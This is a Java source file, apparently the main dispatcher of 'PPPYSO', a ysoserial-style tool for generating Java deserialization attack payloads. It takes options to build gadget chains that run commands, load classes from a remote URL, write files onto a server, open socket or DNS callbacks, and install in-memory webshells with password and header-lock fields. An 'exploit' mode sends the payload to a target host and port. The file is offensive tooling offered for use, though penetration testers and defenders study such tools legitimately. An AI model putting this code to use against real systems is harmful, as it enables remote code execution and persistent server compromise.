package com.ppp;

import com.ppp.annotation.*;
import com.ppp.chain.urldns.DNSHelper;
import com.ppp.chain.urldns.Product;
import com.ppp.exploit.ExploitPayload;
import com.ppp.sinks.SinkScheduler;
import com.ppp.sinks.SinksHelper;
import com.ppp.sinks.annotation.EnchantEnums;
import com.ppp.sinks.annotation.EnchantType;
import com.ppp.utils.RanDomUtils;

import java.io.*;
import java.lang.reflect.Field;
import java.util.List;
import java.util.Map;

/**
 * @author Whoopsunix
 */
public class Scheduler {
    private static String VERSION = "1.2.2";
    private static String userDir = System.getProperty("user.dir") + "/PPPConfig.yml";

    public static void main(String[] args) throws Exception {
//        System.out.println(Arrays.toString(args));
        SinksHelper sinksHelper = new SinksHelper();
        ExploitHelper exploitHelper = null;
        Class<? extends ExploitPayload> exploitClass = null;

        if (args.length == 0) {
            PPPYSOexit();
        }

        if (args[0].equalsIgnoreCase("exp") || args[0].equalsIgnoreCase("exploit")) {
            exploitHelper = new ExploitHelper();
            if (args.length < 2) {
                Printer.error("Missing set exploit class");
            }
            String exp = args[1];
            if (exp.equalsIgnoreCase("-show")) {
                ExploitBuilder.showGadgetClass();
            } else {
                exploitClass = ExploitBuilder.getExploitClass(args[1]);
            }
        }


        Class cls = null;
        if (args.length == 1 && !args[0].equalsIgnoreCase("-h") && !args[0].equalsIgnoreCase("-help")) {
            String configPath = userDir;
            if (new File(args[0]).exists()) {
                configPath = args[0];
            } else {
                PPPYSOexit();
            }
            cls = YamlScheduler.run(configPath, sinksHelper);
        } else {
            cls = CliScheduler.run(args, sinksHelper, exploitHelper);
        }

        if (cls != null) {
            Object gadget = serializationMaker(cls, sinksHelper);
            if (args[0].equalsIgnoreCase("exp") || args[0].equalsIgnoreCase("exploit")) {
                ExploitBuilder.run(exploitClass, gadget, exploitHelper);
            }

        } else {
            javaClassMaker(sinksHelper.getJavaClassHelper());
        }


    }

    public static void javaClassMaker(JavaClassHelper javaClassHelper) throws Exception {
        JavaClassBuilder.build(javaClassHelper);
    }

    /**
     * 序列化生成
     *
     * @param cls
     * @param sinksHelper
     * @throws Exception
     */
    public static Object serializationMaker(Class cls, SinksHelper sinksHelper) throws Exception {

        // 默认生成
        Object gadget = ObjectPayloadBuilder.builder(cls, sinksHelper);

        if (sinksHelper.isLoop()) {
            // 文件分片
            if (sinksHelper.getFileParts() != null) {
                String fileDir = "result/" + RanDomUtils.generateRandomOnlyString(3);
                // 创建目录
                new File("result").mkdir();
                new File(fileDir).mkdir();
                List<byte[]> fileParts = sinksHelper.getFileParts();
                for (int i = 0; i < fileParts.size(); i++) {
                    sinksHelper.setSave(true);
                    sinksHelper.setFileBytes(fileParts.get(i));
                    sinksHelper.setAppend(true);
                    sinksHelper.setSavePath(String.format("%s/%s.bin", fileDir, i));
                    ObjectPayloadBuilder.builder(cls, sinksHelper);
                }
            }
        }
        return gadget;
    }

    public static void PPPYSOexit() throws Exception {
        PPPYSO();
        Printer.yellowInfo("Input [-h|-help] to start");
        if (!new File(userDir).exists()) {
            generateDefaultConfigYaml();
        }
        SinkScheduler.showGadget();
        System.exit(0);
    }

    public static void PPPYSO() {
        String banner = String.format(" __ ___ ___ __  __ __  _  \n" +
                "| o \\ o \\ o \\\\ V // _|/ \\ \n" +
                "|  _/  _/  _/ \\ / \\_ ( o )\n" +
                "|_| |_| |_|   |_| |__/\\_/ \n" +
                "    %s   By. Whoopsunix \n", VERSION);
        Printer.print(banner);
    }

    public static void generateDefaultConfigYaml() throws Exception {
        InputStream resourceAsStream = Thread.currentThread().getContextClassLoader().getResourceAsStream("PPPConfig.yml");
        BufferedReader reader = new BufferedReader(new InputStreamReader(resourceAsStream));

        // 写入文件
        FileWriter fileWriter = new FileWriter(userDir);
        String line;
        while ((line = reader.readLine()) != null) {
            fileWriter.write(line + "\n");
        }
        // 关闭 FileWriter 和 BufferedReader
        fileWriter.close();
        reader.close();
        resourceAsStream.close();
        Printer.warn("Config file not found, Generate a default configuration file PPPConfig.yml in the current directory");
    }

    public static void closePrint() {
        System.setProperty(Printer.PRINT_ENABLED_PROPERTY, String.valueOf(false));
    }

    /**
     * 命令执行增强
     */
    public static void enchantCommand(SinksHelper sinksHelper, Map sinksHelperMap) {
        sinksHelper.setEnchant(EnchantType.Command);
        String command = (String) sinksHelperMap.get(CliOptions.Command.getLongOpt());
        String commandType = (String) sinksHelperMap.get(CliOptions.CommandType.getLongOpt());
        Boolean split = (Boolean) sinksHelperMap.get(CliOptions.Split.getLongOpt());
        String code = (String) sinksHelperMap.get(CliOptions.Code.getLongOpt());
        String codeFile = (String) sinksHelperMap.get(CliOptions.CodeFile.getLongOpt());
        if (command == null && code == null && codeFile == null) {
            Printer.error("Command is null");
        }
        sinksHelper.setCommand(command);
        if (commandType != null) {
            sinksHelper.setCommandType(EnchantEnums.getEnchantEnums(commandType));
        } else {
            sinksHelper.setCommandType(EnchantEnums.Runtime);
        }
        if (split != null) {
            sinksHelper.setSplit(split);
        }
        if (code != null) {
            sinksHelper.setCode(code);
        }
        if (codeFile != null) {
            sinksHelper.setCodeFile(codeFile);
        }
    }

    /**
     * 延时增强
     */
    public static void enchantDelay(SinksHelper sinksHelper, Map sinksHelperMap) {
        sinksHelper.setEnchant(EnchantType.Delay);
        Long delayTime = Long.parseLong((String) sinksHelperMap.get(CliOptions.DelayTime.getLongOpt()));
        if (delayTime == null) {
            Printer.error("Delay time is null");
        }
        sinksHelper.setDelayTime(delayTime);

    }

    /**
     * Socket 增强
     */
    public static void enchantSocket(SinksHelper sinksHelper, Map sinksHelperMap) {
        sinksHelper.setEnchant(EnchantType.Socket);
        String host = (String) sinksHelperMap.get(CliOptions.Host.getLongOpt());
        if (host == null) {
            Printer.error("Host is null");
        }
        sinksHelper.setHost(host);
    }

    /**
     * 远程类加载
     */
    public static void enchantRemoteLoad(SinksHelper sinksHelper, Map sinksHelperMap) {
        sinksHelper.setEnchant(EnchantType.RemoteLoad);
        String url = (String) sinksHelperMap.get(CliOptions.URL.getLongOpt());
        String className = (String) sinksHelperMap.get(CliOptions.ClassName.getLongOpt());
        Object constructor = sinksHelperMap.get(CliOptions.Constructor.getLongOpt());

        if (url == null) {
            Printer.error("URL is null");
        }
        sinksHelper.setUrl(url);
        if (className == null) {
            Printer.error("Class name is null");
        }
        sinksHelper.setClassName(className);
        sinksHelper.setConstructor(constructor);

    }

    /**
     * 文件写入增强
     */
    public static void enchantFileWrite(SinksHelper sinksHelper, Map sinksHelperMap) {
        sinksHelper.setEnchant(EnchantType.FileWrite);
        String serverFilePath = (String) sinksHelperMap.get(CliOptions.ServerFilePath.getLongOpt());
        String localFilePath = (String) sinksHelperMap.get(CliOptions.LocalFilePath.getLongOpt());
        String fileContent = (String) sinksHelperMap.get(CliOptions.FileContent.getLongOpt());
        Boolean append = (Boolean) sinksHelperMap.get(CliOptions.Append.getLongOpt());
        Boolean split = (Boolean) sinksHelperMap.get(CliOptions.Split.getLongOpt());
        Object partSize = sinksHelperMap.get(CliOptions.PartSize.getLongOpt());

        if (serverFilePath == null) {
            Printer.error("Server file path is null");
        }
        sinksHelper.setServerFilePath(serverFilePath);
        if (localFilePath != null) {
            sinksHelper.setLocalFilePath(localFilePath);
        } else if (fileContent != null) {
            sinksHelper.setFileContent(fileContent);
        } else {
            Printer.error("Please set local file path or file content");
        }
        if (append != null) {
            sinksHelper.setAppend(append);
        }
        if (split != null) {
            sinksHelper.setSplit(split);
        }
        if (partSize != null) {
            sinksHelper.setPartSize(Integer.parseInt((String) partSize));
        }
    }

    /**
     * JavaClass 增强
     *
     * @param sinksHelper
     * @param javaClassHelperMap
     */
    public static void enchantJavaClass(SinksHelper sinksHelper, Map javaClassHelperMap) {
        sinksHelper.setEnchant(EnchantType.JavaClass);

        JavaClassHelper javaClassHelper = sinksHelper.getJavaClassHelper();
        String javaClassHelperType = JavaClassHelperType.Utils.getJavaClassHelperType((String) javaClassHelperMap.get(CliOptions.JavaClassHelperType.getLongOpt()));
        javaClassHelper.setJavaClassHelperType(javaClassHelperType);

        if (javaClassHelperType.equalsIgnoreCase(JavaClassHelperType.Custom)) {
            String javaClassFilePath = (String) javaClassHelperMap.get(CliOptions.JavaClassFilePath.getLongOpt());
            if (javaClassFilePath == null) {
                Printer.error(String.format("Please use -%s to set JavaClass file path", CliOptions.JavaClassFilePath.getOpt()));
            }
            javaClassHelper.setJavaClassFilePath(javaClassFilePath);
        } else {
            javaClassHelper.setJavaClassType(JavaClassType.Utils.getJavaClassType((String) javaClassHelperMap.get(CliOptions.JavaClassType.getLongOpt())));
            javaClassHelper.setMiddleware(Middleware.Utils.getMiddleware((String) javaClassHelperMap.get(CliOptions.Middleware.getLongOpt())));
            Object javaClassEnhance = javaClassHelperMap.get(CliOptions.JavaClassEnhance.getLongOpt());
            if (javaClassEnhance != null) {
                javaClassHelper.setJavaClassEnhances(JavaClassEnhance.splitJavaClassEnhance((String) javaClassEnhance));
            }

            Object javaClassMakerEnhance = javaClassHelperMap.get(CliOptions.JavaClassMakerEnhance.getLongOpt());
            if (javaClassMakerEnhance != null) {
                javaClassHelper.setJavaClassMakerEnhances(JavaClassMakerEnhance.splitJavaClassMakerEnhance((String) javaClassMakerEnhance));
            }


            if (javaClassHelperType.equalsIgnoreCase(JavaClassHelperType.MemShell)) {
                String memShell = MemShell.Utils.getMemShell((String) javaClassHelperMap.get(CliOptions.MemShell.getLongOpt()));
                if (memShell == null) {
                    Printer.blueInfo(MemShell.Utils.show());
                    Printer.error(String.format("MemShell is null, use -%s to set", CliOptions.MemShell.getOpt()));
                }
                javaClassHelper.setMemShell(memShell);
                String memShellFunction = MemShellFunction.Utils.getMemShellFunction((String) javaClassHelperMap.get(CliOptions.MemShellFunction.getLongOpt()));
                if (memShellFunction == null) {
                    Printer.blueInfo(MemShellFunction.Utils.show());
                    Printer.error(String.format("MemShellFunction is null, use -%s to set", CliOptions.MemShellFunction.getOpt()));
                }
                javaClassHelper.setMemShellFunction(memShellFunction);
                javaClassHelper.setMemShellType(MemShellType.Utils.getJavaClassType((String) javaClassHelperMap.get(CliOptions.MemShellType.getLongOpt())));
            }

            String fieldName = (String) javaClassHelperMap.get(CliOptions.FieldNAME.getLongOpt());
            if (fieldName != null) {
                javaClassHelper.setNAME(fieldName);
            }
            String fieldHEADER = (String) javaClassHelperMap.get(CliOptions.FieldHEADER.getLongOpt());
            if (fieldHEADER != null) {
                javaClassHelper.setHEADER(fieldHEADER);
            }
            String fieldRHEADER = (String) javaClassHelperMap.get(CliOptions.FieldRHEADER.getLongOpt());
            if (fieldRHEADER != null) {
                javaClassHelper.setRHEADER(fieldRHEADER);
            }
            String filedPath = (String) javaClassHelperMap.get(CliOptions.FieldPATH.getLongOpt());
            if (filedPath != null) {
                javaClassHelper.setPATH(filedPath);
            }
            String filedKey = (String) javaClassHelperMap.get(CliOptions.Fieldkey.getLongOpt());
            if (filedKey != null) {
                javaClassHelper.setKey(filedKey);
            }
            String filedPass = (String) javaClassHelperMap.get(CliOptions.Fieldpass.getLongOpt());
            if (filedPass != null) {
                javaClassHelper.setPass(filedPass);
            }
            String filedLockHeaderKey = (String) javaClassHelperMap.get(CliOptions.FieldLockHeaderKey.getLongOpt());
            if (filedLockHeaderKey != null) {
                javaClassHelper.setLockHeaderKey(filedLockHeaderKey);
            }
            String filedLockHeaderValue = (String) javaClassHelperMap.get(CliOptions.FieldLockHeaderValue.getLongOpt());
            if (filedLockHeaderValue != null) {
                javaClassHelper.setLockHeaderValue(filedLockHeaderValue);
            }
        }

    }

    /**
     * URLDNS 增强
     */
    public static void enchantURLDNS(SinksHelper sinksHelper, Map sinksHelperMap) {
        DNSHelper dnsHelper = new DNSHelper();

        String host = (String) sinksHelperMap.get(CliOptions.Host.getLongOpt());
        if (host == null) {
            Printer.error("Host is null");
        }
        dnsHelper.setHost(host);
        String className = (String) sinksHelperMap.get(CliOptions.ClassName.getLongOpt());
        dnsHelper.setClassName(className);
        String subdomain = (String) sinksHelperMap.get(CliOptions.DNSSubdomain.getLongOpt());
        dnsHelper.setSubdomain(subdomain);

        String products = (String) sinksHelperMap.get(CliOptions.DNSProducts.getLongOpt());
        if (products != null) {
            if (products.equalsIgnoreCase("all")) {
                dnsHelper.setProducts(Product.values());
            } else {
                String[] productArray = products.split(",");
                Product[] productList = new Product[productArray.length];
                for (int i = 0; i < productArray.length; i++) {
                    productList[i] = Product.getProduct(productArray[i]);
                }
                dnsHelper.setProducts(productList);
            }
        }

        sinksHelper.setDnsHelper(dnsHelper);
    }

    public static void enchantEXP(ExploitHelper expHelper, Map helperMap) {
        String host = (String) helperMap.get(CliOptions.EXPHost.getLongOpt());
        String port = (String) helperMap.get(CliOptions.EXPPort.getLongOpt());
        expHelper.setHost(host);
        expHelper.setPort(Integer.parseInt(port));
    }

    /**
     * 不经过处理的插入参数
     *
     * @param sinksHelper
     * @param helperMap
     */
    public static void setSinksHelper(SinksHelper sinksHelper, Map helperMap) {
        for (Object key : helperMap.keySet()) {
            Object value = helperMap.get(key);
            if (value == null) {
                continue;
            }
            try {
                Field field = SinksHelper.class.getDeclaredField(key.toString());
                field.setAccessible(true);
                Class<?> type = field.getType();
                if (type == Integer.class) {
                    field.set(sinksHelper, Integer.parseInt(value.toString()));
                } else if (type == Boolean.class) {
                    field.set(sinksHelper, Boolean.parseBoolean(value.toString()));
                } else {
                    field.set(sinksHelper, value);
                }
            } catch (Exception e) {

            }
        }
    }


}
